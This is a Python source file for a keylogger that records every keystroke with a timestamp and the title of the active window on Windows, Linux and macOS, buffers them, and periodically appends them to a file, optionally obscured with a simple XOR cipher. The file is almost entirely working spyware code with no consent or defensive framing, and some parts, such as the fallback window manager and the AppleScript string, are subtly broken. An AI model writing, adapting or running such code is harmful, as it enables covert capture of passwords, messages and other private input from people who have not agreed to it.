from pynput import keyboard
from datetime import datetime
from abc import ABC, abstractmethod
from typing import Dict, Any
import threading
import time
import platform

class WindowManager(ABC):
    @abstractmethod
    def get_active_window_title(self) -> str:
        pass

class LinuxWindowManager(WindowManager):
    def get_active_window_title(self) -> str:
        try:
            import subprocess
            cmd = "xdotool getwindowfocus getwindowname"
            try:
                return subprocess.check_output(cmd.split()).decode().strip()
            except:
                return "Unknown"
        except:
            return "Unsupported"

class WindowsWindowManager(WindowManager):
    def get_active_window_title(self) -> str:
        try:
            import pygetwindow as gw
            window = gw.getActiveWindow()
            return window.title if window else "Unknown"
        except:
            return "Unsupported"

class MacWindowManager(WindowManager):
    def get_active_window_title(self) -> str:
        try:
            import applescript
            script = 'tell application "System Events"' + \
                     'get name of first application process whose frontmost is true' + \
                     'end tell'
            return applescript.run(script) or "Unknown"
        except:
            return "Unsupported"

def get_window_manager() -> WindowManager:
    system = platform.system().lower()
    if system == 'windows':
        return WindowsWindowManager()
    elif system == 'linux':
        return LinuxWindowManager()
    elif system == 'darwin':
        return MacWindowManager()
    return WindowManager()

class Writer(ABC):
    @abstractmethod
    def write(self, data: Dict[str, Any]) -> None:
        pass

class FileWriter(Writer):
    def __init__(self, filepath: str):
        self.filepath = filepath
    
    def write(self, data: Dict[str, Any]) -> None:
        with open(self.filepath, 'a') as f:
            f.write(str(data) + '\n')

class Encryptor(ABC):
    @abstractmethod
    def encrypt(self, data: str) -> str:
        pass
    
    @abstractmethod
    def decrypt(self, data: str) -> str:
        pass

class XOREncryptor(Encryptor):
    def __init__(self, key: bytes):
        self.key = key
    
    def encrypt(self, data: str) -> str:
        return ''.join(chr(ord(c) ^ self.key[i % len(self.key)]) 
                      for i, c in enumerate(data))
    
    def decrypt(self, data: str) -> str:
        return self.encrypt(data)  # XOR is symmetric

class KeyLoggerService:
    def __init__(self):
        self.buffer = []
        self._lock = threading.Lock()
        self._window_manager = get_window_manager()

    def on_press(self, key):
        with self._lock:
            keystroke = {
                'key': str(key),
                'time': self._get_time(),
                'window': self._window_manager.get_active_window_title()
            }
            self.buffer.append(keystroke)

    @staticmethod
    def _get_time():
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

class KeyLoggerManager:
    def __init__(self, writer: Writer, encryptor: Encryptor = None, 
                 flush_interval: int = 60):
        self.service = KeyLoggerService()
        self.writer = writer
        self.encryptor = encryptor
        self.flush_interval = flush_interval
        self.listener = keyboard.Listener(on_press=self.service.on_press)
        self._timer = None

    def start(self):
        self.listener.start()
        self._start_flush_timer()

    def stop(self):
        self.listener.stop()
        if self._timer:
            self._timer.cancel()
        self._flush_buffer()

    def _start_flush_timer(self):
        self._flush_buffer()
        self._timer = threading.Timer(self.flush_interval, self._start_flush_timer)
        self._timer.daemon = True
        self._timer.start()

    def _flush_buffer(self):
        with self.service._lock:
            if self.service.buffer:
                data = {'keystrokes': self.service.buffer}
                if self.encryptor:
                    data = self.encryptor.encrypt(str(data))
                self.writer.write(data)
                self.service.buffer = []